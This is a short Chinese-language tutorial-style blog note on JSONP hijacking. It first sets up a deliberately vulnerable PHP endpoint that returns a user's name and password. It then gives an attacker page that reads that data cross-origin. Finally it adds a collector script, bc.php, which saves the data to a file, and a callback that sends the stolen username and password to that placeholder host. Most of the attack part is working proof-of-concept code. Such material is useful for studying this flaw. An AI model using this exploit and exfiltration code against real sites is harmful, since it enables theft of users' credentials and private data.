> Author:Y4tacker
>
> Last_Updated_Time:2021/3/29

菜鸡分享篇菜鸡内容

# Jsonp劫持学习

## 什么是Jsonp

感觉菜鸟教程和https://www.bejson.com/knownjson/aboutjsonp/写的差不多，我这种菜鸟都能懂

## 实验

劫持原理网上这张图很形象

![](1.png)

首先我们准备一个jsonp.php，简单的写了一个

```
<?php
header('Content-type: application/json');
$jsoncallback = htmlspecialchars($_REQUEST ['jsoncallback']);//获取回调函数名
if(isset($_REQUEST['jsoncallback'])){
    if($_REQUEST['jsoncallback']=="callbackFunction"){
        $json_data='({"id":"1","name":"Y4tacker","password":"Y4tackerTestPasswd"})';
        
    }else {
        $json_data='({"info":"error"})';
    }
    echo $jsoncallback . "(" . $json_data . ")";//输出jsonp格式的数据
}
?>
```

此时我们访问`http://xxxxxx/jsonp.php?jsoncallback=callbackFunction`

会得到返回信息

```
callbackFunction(({"id":"1","name":"Y4tacker","password":"Y4tackerTestPasswd"}))
```

我们此时再准备一个hack.html页面，内容为

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Test</title>
</head>
<body>
<script type="text/javascript">
function callbackFunction(result)
        {
            alert("username:"+result.name+" password:"+result.password);
        }
</script>
<script type="text/javascript" src="http://xxxxx/jsonp.php?jsoncallback=callbackFunction"></script>
</body>
</html>
```

如果受害者访问这个页面就会有个xss弹窗，弹出关键信息，

当然我们还可以更进一步的利用，讲内容保存到本地服务器，bc.php

```php
<?php
$username=$_GET['username'];
$password=$_GET['password'];
$data="用户名:".$username."密码:".$password.PHP_EOL;
file_put_contents("pwd.txt",$data);
?>
```

再修改上面的callbackFuction，发起一个ajax请求即可，可以用layui这些封装好的，也可以原生内容

```javascript
function callbackFunction(result)
        {
            var username=result.name;
            var password=result.password;
            const requests=new XMLHttpRequest();
            const url="http://xxxxxx/bc.php?username="+username+"&password="+password;
            requests.open("GET",url);
            requests.send();
        }
```

学习完毕